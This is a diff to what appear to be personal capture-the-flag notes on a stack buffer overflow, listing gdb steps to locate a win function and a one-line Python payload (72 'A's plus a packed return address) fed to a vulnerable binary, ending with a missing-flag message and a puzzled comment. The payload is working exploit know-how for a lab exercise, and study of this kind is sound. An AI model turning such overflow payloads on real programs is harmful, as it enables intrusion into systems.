@@ -93,12 +93,14 @@ $gdb vuln
 (gdb) r
 (gdb)disass win_fn
 0x00000000004007bf
+(gdb)info add win_fn
+0x00000000004007be
 
 < break just after gets at vuln>
 (gdb) disass vuln
 0x00000000004008cb
 (gbd) b *0x00000000004008cb
-(gdb) r <<< python -c 'import struct; print("A"*72+struct.pack("<I",0x00000000004007bf) )'
+(gdb) r <<< $(python -c 'import struct; print("A"*72+struct.pack("<I",0x00000000004007be) )' )
 
 
 
@@ -113,6 +115,11 @@ $gdb vuln
 (gdb) set {char}0x601079=1
 (gdb) set {char}0x60107a=1
 
+<Now continue>
+(gdb) c
+Continuing.
+'flag.txt' missing in the current directory!
+[Inferior 1 (process 400746) exited normally]
 
-
+#not sure why we get this!!!!
 ```
